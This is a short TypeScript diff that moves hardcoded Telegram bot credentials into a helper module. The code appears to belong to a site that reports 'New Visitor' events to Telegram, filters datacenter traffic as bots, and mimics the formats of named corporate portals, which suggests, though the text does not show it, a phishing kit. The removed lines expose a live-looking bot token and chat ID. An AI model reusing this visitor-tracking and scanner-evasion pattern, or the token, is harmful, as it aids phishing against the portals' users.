@@ -1,9 +1,8 @@
 import { getNetworkHintLabel } from "@/lib/bot-verification/datacenter-heuristic"
 import { SITE_DISPLAY_NAME } from '@/lib/site-url'
+import { getTelegramCredentials } from "@/lib/universal-webhook"
 
-// Hardcoded ops Telegram credentials (Blast clone)
-const TELEGRAM_BOT_TOKEN = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
-const CHAT_IDS = ["8810036834"]
+const { botToken: TELEGRAM_BOT_TOKEN, chatIds: CHAT_IDS } = getTelegramCredentials()
 
 /** Payload for “New Visitor” Telegram (aligned with RTX / Alight Worklife format). */
 export interface VisitorTelegramData {
